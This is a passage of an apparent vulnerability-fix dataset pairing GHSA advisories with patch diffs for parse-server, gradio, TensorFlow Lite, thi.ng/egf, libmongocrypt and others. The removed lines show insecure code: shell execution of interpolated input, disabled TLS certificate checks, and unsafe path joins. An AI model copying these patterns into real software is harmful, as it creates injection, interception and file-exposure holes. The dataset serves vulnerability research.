'ba2b0a9cb9a568817a114b132a4c2e0911d76df1']","before_first_fix_commit":"{'a8aef820afa2c8d87683668c2961e523016bad9b'}","last_fix_commit":"ba2b0a9cb9a568817a114b132a4c2e0911d76df1","chain_ord_pos":2.0,"commit_datetime":"06\/17\/2022, 15:30:54","message":"Update gcenter.js","author":"Manuel Trezza","comments":null,"stats":"{'additions': 17, 'deletions': 9, 'total': 26}","files":"{'src\/Adapters\/Auth\/gcenter.js': {'additions': 17, 'deletions': 9, 'changes': 26, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/parse-community\/parse-server\/raw\/0cc299f82e367518f2fe7a53b99f3f801a338cf4\/src%2FAdapters%2FAuth%2Fgcenter.js', 'patch': \"@@ -56,8 +56,9 @@ async function getAppleCertificate(publicKeyUrl) {\\n   const cert_headers = await new Promise((resolve, reject) =>\\n     https.get(headOptions, res => resolve(res.headers)).on('error', reject)\\n   );\\n+  const validContentTypes = ['application\/x-x509-ca-cert', 'application\/pkix-cert'];\\n   if (\\n-    cert_headers['content-type'] !== 'application\/pkix-cert' ||\\n+    !validContentTypes.includes(cert_headers['content-type']) ||\\n     cert_headers['content-length'] == null ||\\n     cert_headers['content-length'] > 10000\\n   ) {\\n@@ -66,7 +67,7 @@ async function getAppleCertificate(publicKeyUrl) {\\n       `Apple Game Center - invalid publicKeyUrl: ${publicKeyUrl}`\\n     );\\n   }\\n-  const {certificate, headers} = await getCertificate(publicKeyUrl);\\n+  const { certificate, headers } = await getCertificate(publicKeyUrl);\\n   if (headers['cache-control']) {\\n     const expire = headers['cache-control'].match(\/max-age=([0-9]+)\/);\\n     if (expire) {\\n@@ -90,15 +91,15 @@ function getCertificate(url, buffer) {\\n         });\\n         res.on('end', () => {\\n           if (buffer) {\\n-            resolve({certificate: Buffer.concat(data), headers: res.headers});\\n+            resolve({ certificate: Buffer.concat(data), headers: res.headers });\\n             return;\\n           }\\n           let cert = '';\\n           for (const chunk of data) {\\n             cert += chunk.toString('base64');\\n           }\\n           const certificate = convertX509CertToPEM(cert);\\n-          resolve({certificate, headers: res.headers});\\n+          resolve({ certificate, headers: res.headers });\\n         });\\n       })\\n       .on('error', reject);\\n@@ -132,7 +133,10 @@ function verifySignature(publicKey, authData) {\\n function verifyPublicKeyIssuer(cert, publicKeyUrl) {\\n   const publicKeyCert = pki.certificateFromPem(cert);\\n   if (!ca.cert) {\\n-    throw new Parse.Error(Parse.Error.OBJECT_NOT_FOUND, 'Apple Game Center auth adapter parameter `rootCertificateURL` is invalid.');\\n+    throw new Parse.Error(\\n+      Parse.Error.OBJECT_NOT_FOUND,\\n+      'Apple Game Center auth adapter parameter `rootCertificateURL` is invalid.'\\n+    );\\n   }\\n   try {\\n     if (!ca.cert.verify(publicKeyCert)) {\\n@@ -163,21 +167,25 @@ async function validateAuthData(authData) {\\n \/\/ Returns a promise that fulfills if this app id is valid.\\n async function validateAppId(appIds, authData, options = {}) {\\n   if (!options.rootCertificateUrl) {\\n-    options.rootCertificateUrl = 'https:\/\/cacerts.digicert.com\/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt.pem'\\n+    options.rootCertificateUrl =\\n+      'https:\/\/cacerts.digicert.com\/DigiCertTrustedG4CodeSigningRSA4096SHA3842021CA1.crt.pem';\\n   }\\n   if (ca.url === options.rootCertificateUrl) {\\n     return;\\n   }\\n-  const {certificate, headers} = await getCertificate(options.rootCertificateUrl, true);\\n+  const { certificate, headers } = await getCertificate(options.rootCertificateUrl, true);\\n   if (\\n     headers['content-type'] !== 'application\/x-pem-file' ||\\n     headers['content-length'] == null ||\\n     headers['content-length'] > 10000\\n   ) {\\n-    throw new Parse.Error(Parse.Error.OBJECT_NOT_FOUND, 'Apple Game Center auth adapter parameter `rootCertificateURL` is invalid.');\\n+    throw new Parse.Error(\\n+      Parse.Error.OBJECT_NOT_FOUND,\\n+      'Apple Game Center auth adapter parameter `rootCertificateURL` is invalid.'\\n+    );\\n   }\\n   ca.cert = pki.certificateFromPem(certificate);\\n-  ca.url = options.rootCertificateUrl\\n+  ca.url = options.rootCertificateUrl;\\n }\\n \\n module.exports = {\"}}","message_norm":"update gcenter.js","language":"nl","entities":"[('update', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['src\/Adapters\/Auth\/gcenter.js'])","num_files":1.0},{"index":2951,"vuln_id":"GHSA-rh9j-f5f8-rvgc","cwe_id":"{'CWE-295', 'CWE-287'}","score":8.6,"chain":"{'https:\/\/github.com\/parse-community\/parse-server\/commit\/ba2b0a9cb9a568817a114b132a4c2e0911d76df1', 'https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/0cc299f82e367518f2fe7a53b99f3f801a338cf4', 'https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/2084b7c569697a5230e42511799eeac9219db5a9'}","dataset":"osv","summary":"Authentication bypass vulnerability in Apple Game Center auth adapter  ### Impact\nThe certificate in Apple Game Center auth adapter not validated. As a result, authentication could potentially be bypassed by making a fake certificate accessible via certain Apple domains and providing the URL to that certificate in an authData object.\n\n### Patches\nTo prevent this, a new `rootCertificateUrl` property is introduced to the Parse Server Apple Game Center auth adapter which takes the URL to the root certificate of Apple's Game Center authentication certificate. If no value is set, the `rootCertificateUrl` property defaults to the URL of the [current root certificate](https:\/\/developer.apple.com\/news\/?id=stttq465) as of May 27, 2022.\n\nKeep in mind that the root certificate can change at any time (expected to be announced by Apple) and that it is the developer's responsibility to keep the root certificate URL up-to-date when using the Parse Server Apple Game Center auth adapter.\n\n### Workarounds\nNone.\n\n### References\n- https:\/\/github.com\/parse-community\/parse-server\/security\/advisories\/GHSA-rh9j-f5f8-rvgc\n- https:\/\/developer.apple.com\/news\/?id=stttq465\n- https:\/\/github.com\/parse-community\/parse-server\n\n### More information\n* For questions or comments about this vulnerability visit our [community forum](http:\/\/community.parseplatform.org) or [community chat](http:\/\/chat.parseplatform.org)\n* Report other vulnerabilities at [report.parseplatform.org](https:\/\/report.parseplatform.org)","published_date":"2022-06-17","chain_len":3,"project":"https:\/\/github.com\/parse-community\/parse-server","commit_href":"https:\/\/github.com\/parse-community\/parse-server\/pull\/8054\/commits\/2084b7c569697a5230e42511799eeac9219db5a9","commit_sha":"2084b7c569697a5230e42511799eeac9219db5a9","patch":"MULTI","chain_ord":"['2084b7c569697a5230e42511799eeac9219db5a9', '0cc299f82e367518f2fe7a53b99f3f801a338cf4', 'ba2b0a9cb9a568817a114b132a4c2e0911d76df1']","before_first_fix_commit":"{'a8aef820afa2c8d87683668c2961e523016bad9b'}","last_fix_commit":"ba2b0a9cb9a568817a114b132a4c2e0911d76df1","chain_ord_pos":1.0,"commit_datetime":"06\/17\/2022, 14:16:52","message":"Create game_center.pem","author":"Manuel Trezza","comments":null,"stats":"{'additions': 28, 'deletions': 0, 'total': 28}","files":"{'spec\/support\/cert\/game_center.pem': {'additions': 28, 'deletions': 0, 'changes': 28, 'status': 'added', 'raw_url': 'https:\/\/github.com\/parse-community\/parse-server\/raw\/2084b7c569697a5230e42511799eeac9219db5a9\/spec%2Fsupport%2Fcert%2Fgame_center.pem', 'patch': '@@ -0,0 +1,28 @@\\n+-----BEGIN CERTIFICATE-----\\n+MIIEvDCCA6SgAwIBAgIQXRHxNXkw1L9z5\/3EZ\/T\/hDANBgkqhkiG9w0BAQsFADB\/\\n+MQswCQYDVQQGEwJVUzEdMBsGA1UEChMUU3ltYW50ZWMgQ29ycG9yYXRpb24xHzAd\\n+BgNVBAsTFlN5bWFudGVjIFRydXN0IE5ldHdvcmsxMDAuBgNVBAMTJ1N5bWFudGVj\\n+IENsYXNzIDMgU0hBMjU2IENvZGUgU2lnbmluZyBDQTAeFw0xODA5MTcwMDAwMDBa\\n+Fw0xOTA5MTcyMzU5NTlaMHMxCzAJBgNVBAYTAlVTMRMwEQYDVQQIDApDYWxpZm9y\\n+bmlhMRIwEAYDVQQHDAlDdXBlcnRpbm8xFDASBgNVBAoMC0FwcGxlLCBJbmMuMQ8w\\n+DQYDVQQLDAZHQyBTUkUxFDASBgNVBAMMC0FwcGxlLCBJbmMuMIIBIjANBgkqhkiG\\n+9w0BAQEFAAOCAQ8AMIIBCgKCAQEA06fwIi8fgKrTQu7cBcFkJVF6+Tqvkg7MKJTM\\n+IOYPPQtPF3AZYPsbUoRKAD7\/JXrxxOSVJ7vU1mP77tYG8TcUteZ3sAwvt2dkRbm7\\n+ZO6DcmSggv1Dg4k3goNw4GYyCY4Z2\/8JSmsQ80Iv\/UOOwynpBziEeZmJ4uck6zlA\\n+17cDkH48LBpKylaqthym5bFs9gj11pto7mvyb5BTcVuohwi6qosvbs\/4VGbC2Nsz\\n+ie416nUZfv+xxoXH995gxR2mw5cDdeCew7pSKxEhvYjT2nVdQF0q\/hnPMFnOaEyT\\n+q79n3gwFXyt0dy8eP6KBF7EW9J6b7ubu\/j7h+tQfxPM+gTXOBQIDAQABo4IBPjCC\\n+ATowCQYDVR0TBAIwADAOBgNVHQ8BAf8EBAMCB4AwEwYDVR0lBAwwCgYIKwYBBQUH\\n+AwMwYQYDVR0gBFowWDBWBgZngQwBBAEwTDAjBggrBgEFBQcCARYXaHR0cHM6Ly9k\\n+LnN5bWNiLmNvbS9jcHMwJQYIKwYBBQUHAgIwGQwXaHR0cHM6Ly9kLnN5bWNiLmNv\\n+bS9ycGEwHwYDVR0jBBgwFoAUljtT8Hkzl699g+8uK8zKt4YecmYwKwYDVR0fBCQw\\n+IjAgoB6gHIYaaHR0cDovL3N2LnN5bWNiLmNvbS9zdi5jcmwwVwYIKwYBBQUHAQEE\\n+SzBJMB8GCCsGAQUFBzABhhNodHRwOi8vc3Yuc3ltY2QuY29tMCYGCCsGAQUFBzAC\\n+hhpodHRwOi8vc3Yuc3ltY2IuY29tL3N2LmNydDANBgkqhkiG9w0BAQsFAAOCAQEA\\n+I\/j\/PcCNPebSAGrcqSFBSa2mmbusOX01eVBg8X0G\/z8Z+ZWUfGFzDG0GQf89MPxV\\n+woec+nZuqui7o9Bg8s8JbHV0TC52X14CbTj9w\/qBF748WbH9gAaTkrJYPm+MlNhu\\n+tjEuQdNl\/YXVMvQW4O8UMHTi09GyJQ0NC4q92Wxvx1m\/qzjvTLvrXHGQ9pEHhPyz\\n+vfBLxQkWpNoCNKU7UeESyH06XOrGc9MsII9deeKsDJp9a0jtx+pP4MFVtFME9SSQ\\n+tMBs0It7WwEf7qcRLpialxKwY2EzQ9g4WnANHqo18PrDBE10TFpZPzUh7JhMViVr\\n+EEbl0YdElmF8Hlamah\/yNw==\\n+-----END CERTIFICATE-----'}}","message_norm":"create game_center.pem","language":"ro","entities":null,"classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['spec\/support\/cert\/game_center.pem'])","num_files":1.0},{"index":2952,"vuln_id":"GHSA-rhcw-wjcm-9h6g","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/undertow-io\/undertow\/pull\/997\/commits\/98a9ab7f2d7fe7a7254eaf17d47816c452169c90'}","dataset":"osv","summary":"Denial of service in Undertow A flaw was found in the Undertow AJP connector. Malicious requests and abrupt connection closes could be triggered by an attacker using query strings with non-RFC compliant characters resulting in a denial of service. The highest threat from this vulnerability is to system availability. This affects Undertow 2.1.5.SP1, 2.0.33.SP2, and 2.2.3.SP1.","published_date":"2022-02-09","chain_len":1,"project":"https:\/\/github.com\/undertow-io\/undertow","commit_href":"https:\/\/github.com\/undertow-io\/undertow\/pull\/997\/commits\/98a9ab7f2d7fe7a7254eaf17d47816c452169c90","commit_sha":"98a9ab7f2d7fe7a7254eaf17d47816c452169c90","patch":"SINGLE","chain_ord":"['98a9ab7f2d7fe7a7254eaf17d47816c452169c90']","before_first_fix_commit":"{'47dc5e37cb20d8eeb4d4f632fe959d436f86128a'}","last_fix_commit":"98a9ab7f2d7fe7a7254eaf17d47816c452169c90","chain_ord_pos":1.0,"commit_datetime":"11\/29\/2020, 13:24:40","message":"UNDERTOW-1813 Make PathResourceManager.getResource rethrow a SecurityException","author":"Boris Unckel","comments":null,"stats":"{'additions': 7, 'deletions': 1, 'total': 8}","files":"{'core\/src\/main\/java\/io\/undertow\/server\/handlers\/resource\/PathResourceManager.java': {'additions': 7, 'deletions': 1, 'changes': 8, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/undertow-io\/undertow\/raw\/98a9ab7f2d7fe7a7254eaf17d47816c452169c90\/core%2Fsrc%2Fmain%2Fjava%2Fio%2Fundertow%2Fserver%2Fhandlers%2Fresource%2FPathResourceManager.java', 'patch': '@@ -230,9 +230,15 @@ public Resource getResource(final String p) {\\n                 log.tracef(\"Failed to get path resource %s from path resource manager with base %s, as the path did not exist\", p, base);\\n                 return null;\\n             }\\n-        } catch (Exception e) {\\n+        } catch (IOException e) {\\n             UndertowLogger.REQUEST_LOGGER.debugf(e, \"Invalid path %s\", p);\\n             return null;\\n+        } catch (SecurityException e) {\\n+            UndertowLogger.REQUEST_LOGGER.errorf(e, \"Missing JSM permissions for path %s\", p);\\n+            throw e;\\n+        } catch (Exception e) {\\n+            UndertowLogger.REQUEST_LOGGER.debugf(e, \"Other issue for path %s\", p);\\n+            return null;\\n         }\\n     }'}}","message_norm":"undertow-1813 make pathresourcemanager.getresource rethrow a securityexception","language":"en","entities":"[('securityexception', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['core\/src\/main\/java\/io\/undertow\/server\/handlers\/resource\/PathResourceManager.java'])","num_files":1.0},{"index":2955,"vuln_id":"GHSA-rhq2-3vr9-6mcr","cwe_id":"{'CWE-22'}","score":8.3,"chain":"{'https:\/\/github.com\/gradio-app\/gradio\/commit\/41bd3645bdb616e1248b2167ca83636a2653f781'}","dataset":"osv","summary":"Files on the host computer can be accessed from the Gradio interface ### Impact\nThis is a vulnerability that affects anyone who creates and publicly shares Gradio interfaces using `gradio<2.4.8`. Because of the way that static files were being served, someone who generated a public Gradio link and shared it with others would potentially be exposing the files on the computer that generated the link, while the link was active. An attacker would be able to view the contents of a file on the computer if they knew the exact relative filepath. We do not have any evidence that this was ever exploited, but we treated the issue seriously and immediately took steps to mitigate it (see below)\n\n### Response\n1. We worked with @haby0 to immediately patch the issue and released a new version, `gradio 2.5.0`, within 24 hours of the issue being brought to our attention \n2. We enabled a notification that is printed to anyone using an older version of gradio telling them to upgrade (see screenshot below)\n3. We expanded our test suite to test for this vulnerability ensuring that our patch does not get reverted in future releases of `gradio`\n\n![image](https:\/\/user-images.githubusercontent.com\/1778297\/146251425-f36b519b-6d4a-4dfb-8d89-c1ed005979d3.png)\n\n### Patches\nThe problem has been patched in `gradio>=2.5.0`.","published_date":"2022-01-21","chain_len":1,"project":"https:\/\/github.com\/gradio-app\/gradio","commit_href":"https:\/\/github.com\/gradio-app\/gradio\/commit\/41bd3645bdb616e1248b2167ca83636a2653f781","commit_sha":"41bd3645bdb616e1248b2167ca83636a2653f781","patch":"SINGLE","chain_ord":"['41bd3645bdb616e1248b2167ca83636a2653f781']","before_first_fix_commit":"{'0b2c4901a63b2e5a7d7b3964d27b8f82d6d330e1'}","last_fix_commit":"41bd3645bdb616e1248b2167ca83636a2653f781","chain_ord_pos":1.0,"commit_datetime":"12\/14\/2021, 21:01:55","message":"secure path hotfix","author":"Ali Abid","comments":null,"stats":"{'additions': 2, 'deletions': 3, 'total': 5}","files":"{'gradio\/networking.py': {'additions': 2, 'deletions': 3, 'changes': 5, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/gradio-app\/gradio\/raw\/41bd3645bdb616e1248b2167ca83636a2653f781\/gradio%2Fnetworking.py', 'patch': '@@ -377,15 +377,14 @@ def interpret():\\n @app.route(\"\/file\/<path:path>\", methods=[\"GET\"])\\n @login_check\\n def file(path):\\n-    path = secure_filename(path)\\n     if app.interface.encrypt and isinstance(app.interface.examples, str) and path.startswith(app.interface.examples):\\n-        with open(os.path.join(app.cwd, path), \"rb\") as encrypted_file:\\n+        with open(safe_join(app.cwd, path), \"rb\") as encrypted_file:\\n             encrypted_data = encrypted_file.read()\\n         file_data = encryptor.decrypt(\\n             app.interface.encryption_key, encrypted_data)\\n         return send_file(io.BytesIO(file_data), attachment_filename=os.path.basename(path))\\n     else:\\n-        return send_file(os.path.join(app.cwd, path))\\n+        return send_file(safe_join(app.cwd, path))\\n \\n \\n @app.route(\"\/api\/queue\/push\/\", methods=[\"POST\"])'}}","message_norm":"secure path hotfix","language":"en","entities":"[('secure', 'SECWORD', ''), ('hotfix', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['gradio\/networking.py'])","num_files":1.0},{"index":2958,"vuln_id":"GHSA-rhrq-64mq-hf9h","cwe_id":"{'CWE-369'}","score":5.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e206baedf8bef0334cca3eb92bab134ef525a28'}","dataset":"osv","summary":"FPE in TFLite division operations ### Impact\nThe implementation of division in TFLite is [vulnerable to a division by 0 error](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/460e000de3a83278fb00b61a16d161b1964f15f4\/tensorflow\/lite\/kernels\/div.cc)\n\nThere is no check that the divisor tensor does not contain zero elements.\n\n### Patches\nWe have patched the issue in GitHub commit [1e206baedf8bef0334cca3eb92bab134ef525a28](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e206baedf8bef0334cca3eb92bab134ef525a28).\n\nThe fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-08-25","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/1e206baedf8bef0334cca3eb92bab134ef525a28","commit_sha":"1e206baedf8bef0334cca3eb92bab134ef525a28","patch":"SINGLE","chain_ord":"['1e206baedf8bef0334cca3eb92bab134ef525a28']","before_first_fix_commit":"{'9579070c3fe96b4ed3b07c1b294c7a402250fb43'}","last_fix_commit":"1e206baedf8bef0334cca3eb92bab134ef525a28","chain_ord_pos":1.0,"commit_datetime":"07\/16\/2021, 21:23:21","message":"Prevent a division by 0 in division ops.\n\nPiperOrigin-RevId: 385223169\nChange-Id: Ia4228960b5d2aa44480385f74bdd70d21a3613c3","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 16, 'deletions': 1, 'total': 17}","files":"{'tensorflow\/lite\/kernels\/div.cc': {'additions': 16, 'deletions': 1, 'changes': 17, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/1e206baedf8bef0334cca3eb92bab134ef525a28\/tensorflow%2Flite%2Fkernels%2Fdiv.cc', 'patch': \"@@ -216,9 +216,23 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n   TF_LITE_ENSURE_OK(context,\\n                     GetOutputSafe(context, node, kOutputTensor, &output));\\n \\n-  if (output->type == kTfLiteFloat32 || output->type == kTfLiteInt32) {\\n+  \/\/ TODO(b\/193904910): This can written with C++ templates\\n+#define TF_LITE_CHECK_DIV_NON_ZERO(data_type)                       \\\\\\n+  const auto* input2_data = GetTensorData<data_type>(input2);       \\\\\\n+  const size_t input2_elements = input2->bytes \/ sizeof(data_type); \\\\\\n+  for (size_t i = 0; i < input2_elements; i++) {                    \\\\\\n+    TF_LITE_ENSURE(context, input2_data[i] != 0);                   \\\\\\n+  }\\n+\\n+  if (output->type == kTfLiteFloat32) {\\n+    \/\/ Div by zero seems ok in this case, just like in TF case infinities are\\n+    \/\/ returned. So we don't do a check at this point.\\n+    EvalDiv<kernel_type>(context, node, params, data, input1, input2, output);\\n+  } else if (output->type == kTfLiteInt32) {\\n+    TF_LITE_CHECK_DIV_NON_ZERO(int32_t);\\n     EvalDiv<kernel_type>(context, node, params, data, input1, input2, output);\\n   } else if (output->type == kTfLiteUInt8) {\\n+    TF_LITE_CHECK_DIV_NON_ZERO(uint8_t);\\n     TF_LITE_ENSURE_OK(\\n         context, EvalQuantized<kernel_type>(context, node, params, data, input1,\\n                                             input2, output));\\n@@ -229,6 +243,7 @@ TfLiteStatus Eval(TfLiteContext* context, TfLiteNode* node) {\\n         output->type);\\n     return kTfLiteError;\\n   }\\n+#undef TF_LITE_CHECK_DIV_NON_ZERO\\n \\n   return kTfLiteOk;\\n }\"}}","message_norm":"prevent a division by 0 in division ops.\n\npiperorigin-revid: 385223169\nchange-id: ia4228960b5d2aa44480385f74bdd70d21a3613c3","language":"en","entities":"[('prevent', 'ACTION', ''), ('division by 0', 'SECWORD', ''), ('385223169', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/lite\/kernels\/div.cc'])","num_files":1.0},{"index":2959,"vuln_id":"GHSA-rj44-gpjc-29r7","cwe_id":"{'CWE-78'}","score":6.4,"chain":"{'https:\/\/github.com\/thi-ng\/umbrella\/commit\/88f61656e5f5cfba960013b8133186389efaf243'}","dataset":"osv","summary":"[thi.ng\/egf] Potential arbitrary code execution of `#gpg`-tagged property values ### Impact\n\nPotential for arbitrary code execution in `#gpg`-tagged property values (only if `decrypt: true` option is enabled)\n\n### Patches\n\n[A fix](https:\/\/github.com\/thi-ng\/umbrella\/commit\/3e14765d6bfd8006742c9e7860bc7d58ae94dfa5) has already been released as v0.4.0\n\n### Workarounds\n\nBy default, EGF parse functions do NOT attempt to decrypt values (since GPG is only available in non-browser env).\n\nHowever, if GPG encrypted values are used\/required:\n\n1. Perform a regex search for `#gpg`-tagged values in the EGF source file\/string and check for backtick (\\`) chars in the encrypted value string\n2. Replace\/remove them or skip parsing if present...\n\n### References\n\nhttps:\/\/github.com\/thi-ng\/umbrella\/security\/advisories\/GHSA-rj44-gpjc-29r7#advisory-comment-65261\n\n### For more information\n\nIf you have any questions or comments about this advisory, please open an issue in the [thi.ng\/umbrella repo](https:\/\/github.com\/thi-ng\/umbrella\/issues), of which this package is part of.","published_date":"2021-04-06","chain_len":1,"project":"https:\/\/github.com\/thi-ng\/umbrella","commit_href":"https:\/\/github.com\/thi-ng\/umbrella\/commit\/88f61656e5f5cfba960013b8133186389efaf243","commit_sha":"88f61656e5f5cfba960013b8133186389efaf243","patch":"SINGLE","chain_ord":"['88f61656e5f5cfba960013b8133186389efaf243']","before_first_fix_commit":"{'c3f5ec12f324a4e627b26dc45d480c0e761602ea', '3e14765d6bfd8006742c9e7860bc7d58ae94dfa5'}","last_fix_commit":"88f61656e5f5cfba960013b8133186389efaf243","chain_ord_pos":1.0,"commit_datetime":"03\/27\/2021, 08:52:42","message":"Merge pull request from GHSA-rj44-gpjc-29r7\n\nfix(egf): update GPG invocation to avoid arb code exec","author":"Karsten Schmidt","comments":null,"stats":"{'additions': 4, 'deletions': 2, 'total': 6}","files":"{'packages\/egf\/src\/tags.ts': {'additions': 4, 'deletions': 2, 'changes': 6, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/thi-ng\/umbrella\/raw\/88f61656e5f5cfba960013b8133186389efaf243\/packages%2Fegf%2Fsrc%2Ftags.ts', 'patch': '@@ -1,7 +1,7 @@\\n import type { IObjectOf } from \"@thi.ng\/api\";\\n import { maybeParseFloat, maybeParseInt, unescape } from \"@thi.ng\/strings\";\\n import { base64Decode } from \"@thi.ng\/transducers-binary\";\\n-import { execSync } from \"child_process\";\\n+import { execFileSync } from \"child_process\";\\n import { readFileSync } from \"fs\";\\n import { resolve as resolvePath } from \"path\";\\n import { IS_NODE, NODE_ONLY, TagParser } from \".\/api\";\\n@@ -24,7 +24,9 @@ export const BUILTINS: IObjectOf<TagParser> = {\\n     gpg: IS_NODE\\n         ? (_, body, ctx) =>\\n               (ctx.opts.decrypt\\n-                  ? execSync(`echo \"${body}\" | gpg --decrypt`).toString()\\n+                  ? execFileSync(\"gpg\", [\"--decrypt\"], {\\n+                        input: body,\\n+                    }).toString()\\n                   : body\\n               ).trim()\\n         : NODE_ONLY,'}}","message_norm":"merge pull request from ghsa-rj44-gpjc-29r7\n\nfix(egf): update gpg invocation to avoid arb code exec","language":"ca","entities":"[('ghsa-rj44-gpjc-29r7', 'VULNID', 'GHSA'), ('fix(egf', 'ACTION', ''), ('code exec', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['packages\/egf\/src\/tags.ts'])","num_files":1.0},{"index":2961,"vuln_id":"GHSA-rjmf-p882-645m","cwe_id":"{'CWE-295'}","score":6.8,"chain":"{'https:\/\/github.com\/mongodb\/libmongocrypt\/commit\/76365515ff8754b9f705e56428dd0d7efa7f541b'}","dataset":"osv","summary":"Improper Certificate Validation A specific version of the Node.js mongodb-client-encryption module does not perform correct validation of the KMS server\u2019s certificate. This vulnerability in combination with a privileged network position active MITM attack could result in interception of traffic between the Node.js driver and the KMS service rendering client-side field level encryption (CSFLE) ineffective. This issue was discovered during internal testing and affects mongodb-client-encryption module version 1.2.0, which was available from 2021-Jan-29 and deprecated in the NPM Registry on 2021-Feb-04. This vulnerability does not impact driver traffic payloads with CSFLE-supported key services from applications residing inside the AWS, GCP, and Azure nework fabrics due to compensating controls in these environments. This issue does not impact driver workloads that don\u2019t use Field Level Encryption.","published_date":"2021-04-12","chain_len":1,"project":"https:\/\/github.com\/mongodb\/libmongocrypt","commit_href":"https:\/\/github.com\/mongodb\/libmongocrypt\/commit\/76365515ff8754b9f705e56428dd0d7efa7f541b","commit_sha":"76365515ff8754b9f705e56428dd0d7efa7f541b","patch":"SINGLE","chain_ord":"['76365515ff8754b9f705e56428dd0d7efa7f541b']","before_first_fix_commit":"{'30d8adc205bffcc9764e4e556a25146687183751'}","last_fix_commit":"76365515ff8754b9f705e56428dd0d7efa7f541b","chain_ord_pos":1.0,"commit_datetime":"02\/05\/2021, 23:37:36","message":"fix: always authorize TLS endpoints, use servername for SNI (#159)\n\nTLS endpoints should always be authorized. \r\nIn order to properly communicate with GCP's KMS servers\r\nwe need to provide a `servername`, so the endpoint can serve the\r\ncorrect TLS certificate.","author":"Matt Broadstone","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'bindings\/node\/lib\/stateMachine.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/mongodb\/libmongocrypt\/raw\/76365515ff8754b9f705e56428dd0d7efa7f541b\/bindings%2Fnode%2Flib%2FstateMachine.js', 'patch': \"@@ -217,7 +217,7 @@ module.exports = function(modules) {\\n     kmsRequest(request) {\\n       const parsedUrl = request.endpoint.split(':');\\n       const port = parsedUrl[1] != null ? Number.parseInt(parsedUrl[1], 10) : HTTPS_PORT;\\n-      const options = { host: parsedUrl[0], port, rejectUnauthorized: false };\\n+      const options = { host: parsedUrl[0], servername: parsedUrl[0], port };\\n       const message = request.message;\\n \\n       return new Promise((resolve, reject) => {\"}}","message_norm":"fix: always authorize tls endpoints, use servername for sni (#159)\n\ntls endpoints should always be authorized. \r\nin order to properly communicate with gcp's kms servers\r\nwe need to provide a `servername`, so the endpoint can serve the\r\ncorrect tls certificate.","language":"en","entities":"[('tls', 'SECWORD', ''), ('servername', 'SECWORD', ''), ('#159', 'ISSUE', ''), ('tls', 'SECWORD', ''), ('servers', 'SECWORD', ''), ('servername', 'SECWORD', ''), ('tls', 'SECWORD', ''), ('certificate', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['bindings\/node\/lib\/stateMachine.js'])","num_files":1.0},{"index":2965,"vuln_id":"GHSA-rmj8-8hhh-gv5h","cwe_id":"{'CWE-200'}","score":8.0,"chain":"{'https:\/\/github.com\/puma\/puma\/commit\/b70f451fe8abc0cff192c065d549778452e155bb'}","dataset":"osv","summary":"Information Exposure when using Puma with Rails ### Impact\nPrior to `puma` version `5.6.2`, `puma` may not always call `close` on the response body. Rails, prior to version `7.0.2.2`, depended on the response body being closed in order for its `CurrentAttributes` implementation to work correctly.\n\nFrom Rails:\n\n> Under certain circumstances response bodies will not be closed, for example a bug in a webserver[1] or a bug in a Rack middleware. In the event a response is not notified of a close, ActionDispatch::Executor will not know to reset thread local state for the next request. This can lead to data being leaked to subsequent requests, especially when interacting with ActiveSupport::CurrentAttributes.\n\nThe combination of these two behaviors (Puma not closing the body + Rails' Executor implementation) causes information leakage.\n\n### Patches\nThis problem is fixed in Puma versions 5.6.2 and 4.3.11.\n\nThis problem is fixed in Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.\n\nSee: \nhttps:\/\/github.com\/advisories\/GHSA-wh98-p28r-vrc9 \nfor details about the rails vulnerability\n\nUpgrading to a patched Rails _or_ Puma version fixes the vulnerability.\n\n### Workarounds\n\nUpgrade to Rails versions 7.02.2, 6.1.4.6, 6.0.4.6, and 5.2.6.2.\n\nThe [Rails CVE](https:\/\/groups.google.com\/g\/ruby-security-ann\/c\/FkTM-_7zSNA\/m\/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1) includes a middleware that can be used instead.\n\n### References\n\n* Rails CVE: [CVE-2022-23633](https:\/\/groups.google.com\/g\/ruby-security-ann\/c\/FkTM-_7zSNA\/m\/K2RiMJBlBAAJ?utm_medium=email&utm_source=footer&pli=1)\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [puma](https:\/\/github.com\/puma\/puma)\n* See our [security 